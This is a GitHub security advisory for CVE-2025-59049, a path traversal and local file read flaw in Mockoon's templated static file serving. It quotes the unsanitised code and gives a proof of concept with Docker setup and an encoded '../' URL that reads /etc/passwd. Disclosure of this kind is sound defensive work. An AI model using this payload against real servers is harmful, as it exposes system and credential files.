# [H] Mockoon has a Path Traversal and LFI in the static file serving endpoint

## Summary
Severity: High
Advisory: GHSA-w7f9-wqc4-3wxr
CVE: CVE-2025-59049
CWE: CWE-22, CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-03-11
Source: https://github.com/advisories/GHSA-w7f9-wqc4-3wxr
Type: github-advisory

## Affected
- npm: `@mockoon/commons-server` — affected >=0 <9.2.0
- npm: `@mockoon/cli` — affected >=0 <9.2.0

## Details
### Summary
A mock API configuration for static file serving following the same approach presented in the [documentation page](https://mockoon.com/tutorials/create-endpoint-serving-static-file/), where the server filename is generated via templating features from user input is vulnerable to Path Traversal and LFI, allowing an attacker to get any file in the mock server filesystem.
The issue may be particularly relevant in cloud hosted server instances

### Details
In `sendFileWithCallback`([code](https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400)) and `sendFile`([code](https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551)) the `filePath` variable is parsed using `TemplateParser`

```js
let filePath = TemplateParser({
        shouldOmitDataHelper: false,
        // replace backslashes with forward slashes, but not if followed by a dot (to allow helpers with paths containing properties with dots: e.g. {{queryParam 'path.prop\.with\.dots'}})
        content: routeResponse.filePath.replace(/\\(?!\.)/g, '/'),
        environment: this.environment,
        processedDatabuckets: this.processedDatabuckets,
        globalVariables: this.globalVariables,
        request: serverRequest,
        envVarsPrefix: this.options.envVarsPrefix
      });
```

The path extracted from the request parameters used when composing the final file path is not sanitized and is vulnerable to path traversal exploits (e.g. `../../../../../etc/passwd`)

### PoC
#### Test setup
The issue has been tested with `mockoon-cli`, using the Docker image `mockoon/cli:latest`

[config.json](https://github.com/user-attachments/files/18199899/config.json)

```bash
# Folder setup
mkdir mockoon-test
cd mockoon-test

# put config.json in mockooon-test dir

mkdir static
```

```bash
# Run container
docker run -d --mount type=bind,source=./config.json,target=/data,readonly -v ./static:/static -p 3000:3000 mockoon/cli:latest -d data -p 3000
```

#### Payload to reproduce
Browsing directly to `http://localhost:3000/static/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd` is going to display the `/etc/passwd` file in the container filesystem

## References
- https://github.com/mockoon/mockoon/security/advisories/GHSA-w7f9-wqc4-3wxr
- https://nvd.nist.gov/vuln/detail/CVE-2025-59049
- https://github.com/mockoon/mockoon/commit/c7f6e23e87dc3b8cc44e5802af046200a797bd2e
- https://github.com/mockoon/mockoon
- https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1400
- https://github.com/mockoon/mockoon/blob/1ed31c4059d7f757f6cb2a43e10dc81b0d9c55a9/packages/commons-server/src/libs/server/server.ts#L1551
